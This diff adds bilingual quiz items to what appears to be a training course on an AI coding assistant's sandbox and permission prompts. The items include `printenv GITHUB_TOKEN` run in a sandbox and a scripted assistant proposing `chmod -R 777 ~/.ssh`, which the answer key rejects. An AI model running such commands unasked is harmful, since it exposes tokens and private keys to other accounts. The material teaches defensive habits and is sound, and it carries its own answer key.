+      "more": { "slug": "permission-modes", "anchor": "skip-all-checks-with-bypasspermissions-mode" }
+    },
+    {
+      "id": "powers-predict-5",
+      "type": "predict",
+      "prompt": { "en": "What does the sandboxed command print?", "ja": "サンドボックス内のコマンドは何を表示しますか？" },
+      "situation": {
+        "en": "The sandbox is on, with no `credentials` settings. Your shell has `GITHUB_TOKEN` set. Claude runs this inside the sandbox.",
+        "ja": "サンドボックスはオンで、`credentials` の設定はありません。シェルには `GITHUB_TOKEN` が設定されています。Claude がサンドボックスの中でこれを実行します。"
+      },
+      "code": ["printenv GITHUB_TOKEN"],
+      "opts": [
+        {
+          "text": { "en": "ghp_FAKE7f3k2example", "ja": "ghp_FAKE7f3k2example" },
+          "mono": true,
+          "feedback": {
+            "en": "Right. Sandboxed commands inherit Claude Code's environment variables, secrets included, unless you list them in `sandbox.credentials.envVars`.",
+            "ja": "正解です。サンドボックス内のコマンドは、`sandbox.credentials.envVars` に書かない限り、秘密情報も含めて Claude Code の環境変数を引き継ぎます。"
+          }
+        },
+        {
+          "text": { "en": "Nothing: the sandbox removes secrets automatically", "ja": "何も表示されない（サンドボックスが自動で秘密情報を取り除く）" },
+          "feedback": {
+            "en": "There's no built-in list of secrets to remove. Only the variables you list are removed.",
+            "ja": "取り除く秘密情報の一覧は、最初からは用意されていません。取り除かれるのは、あなたが書き出した変数だけです。"
+          }
+        },
+        {
+          "text": { "en": "An error: the sandbox blocks reading variables", "ja": "エラー（サンドボックスが変数の読み取りを止める）" },
+          "feedback": {
+            "en": "The sandbox limits files and network. Environment variables pass through unless you remove them.",
+            "ja": "サンドボックスが制限するのはファイルとネットワークです。環境変数は、取り除かない限りそのまま渡ります。"
+          }
+        },
+        {
+          "text": { "en": "A placeholder instead of the real token", "ja": "本物のトークンの代わりの仮の値" },
+          "feedback": {
+            "en": "A placeholder appears only if you set that variable to `mask` in `sandbox.credentials.envVars`. With no settings, it's the real value.",
+            "ja": "仮の値が出るのは、`sandbox.credentials.envVars` でその変数を `mask` に設定したときだけです。設定がなければ本物の値です。"
+          }
+        }
+      ],
+      "answer": 0,
+      "explain": {
+        "en": "A fence doesn't empty your pockets. Add `{ \"name\": \"GITHUB_TOKEN\", \"mode\": \"deny\" }` under `sandbox.credentials.envVars` so the variable is unset before each sandboxed command.",
+        "ja": "柵があっても、ポケットの中身はそのままです。`sandbox.credentials.envVars` に `{ \"name\": \"GITHUB_TOKEN\", \"mode\": \"deny\" }` を加えると、サンドボックス内のコマンドの前に毎回その変数が消されます。"
+      },
+      "more": { "slug": "sandboxing", "anchor": "protect-credentials" }
+    },
+    {
+      "id": "powers-approve-2",
+      "type": "approve",
+      "surface": "terminal",
+      "prompt": { "en": "Claude wants to do this. What do you press?", "ja": "Claude がこれを実行しようとしています。どれを押しますか？" },
+      "explain": {
+        "en": "`chmod -R 777 ~/.ssh` makes your login keys readable and changeable by every account on the machine, and SSH may then refuse the keys anyway. Press No and tell Claude: \"Don't open up ~/.ssh. Check why the push is denied instead.\"",
+        "ja": "`chmod -R 777 ~/.ssh` は、ログイン用の鍵をマシン上のすべてのアカウントが読み書きできる状態にします。しかもそうなると SSH が鍵を使うのを拒むこともあります。「いいえ」を押して、Claude に「~/.ssh は開かないで。push が拒否される理由を調べて」と伝えましょう。"
+      },
+      "task": {
+        "en": "`git push` fails with \"Permission denied (publickey)\". Please fix it.",
+        "ja": "`git push` が「Permission denied (publickey)」で失敗する。直して。"
+      },
+      "narration": {
+        "en": "It's a permission error, so I'll open up the SSH folder's permissions so nothing is blocked.",
+        "ja": "権限のエラーなので、何も妨げられないように SSH フォルダの権限を開放します。"
+      },
+      "tool": "Bash",
+      "target": "chmod -R 777 ~/.ssh",
+      "reason": { "en": "Fix the SSH permission error", "ja": "SSH の権限エラーを直します" },
+      "alwaysLabel": {
+        "en": "Yes, and don't ask again for: chmod -R 777 *",
+        "ja": "はい、今後 chmod -R 777 * は確認しない"
+      },
+      "choices": ["yes", "always", "auto", "no"],
+      "accept": ["no"],
+      "outcomes": {
+        "yes": {
+          "feedback": {
+            "en": "Your private keys are now readable by every account and service on the machine. And \"Permission denied (publickey)\" usually means the server didn't accept your key, which file permissions can't fix.",
+            "ja": "秘密鍵が、マシン上のすべてのアカウントやサービスから読める状態になりました。しかも「Permission denied (publickey)」はたいてい、サーバーがあなたの鍵を受け付けなかったという意味で、ファイルの権限では直りません。"
+          },
+          "headline": {
+            "en": "Laptop's SSH keys left open to every account to \"fix\" a git push",
+            "ja": "git push を「直す」ため、ノート PC の SSH 鍵が全アカウントに開放される"
+          }
+        },
+        "always": {
+          "feedback": {
+            "en": "Worse than Yes: your keys are open now, and a saved rule lets Claude open up any folder the same way later, without asking.",
+            "ja": "「はい」より悪い選択です。鍵は今すでに開放され、さらに保存されたルールによって、今後 Claude はどのフォルダでも同じように確認なしで開放できてしまいます。"
+          },
+          "headline": {
+            "en": "Assistant now opens folders to everyone without asking",
+            "ja": "アシスタント、確認なしでフォルダを全員に開放するように"
+          }
+        },
+        "auto": {
+          "feedback": {
+            "en": "This runs the command now, opening your keys, and hands later prompts to a classifier model. In this course, stay in Manual mode and answer this one yourself: No.",
+            "ja": "これでコマンドが今すぐ実行されて鍵が開放され、さらに今後の確認は分類モデルに任されます。このコースでは Manual モードのまま、これには自分で答えましょう。答えは「いいえ」です。"
+          },
+          "headline": {
+            "en": "SSH keys opened to all, and no one is checking the next step",
+            "ja": "SSH 鍵が全員に開放、次の一手も誰も確認せず"
+          }
+        },
+        "no": {
+          "feedback": {
+            "en": "Right. 777 removes the lock instead of finding the problem. Ask Claude to check which key is loaded and whether the server knows it; private keys should stay `600`.",
+            "ja": "その通りです。777 は問題を探す代わりにロックを外してしまいます。どの鍵が読み込まれているか、サーバーがその鍵を知っているかを Claude に確認してもらいましょう。秘密鍵は `600` のままにしておくべきです。"
+          }
+        }
+      }
+    }
+  ]
+}
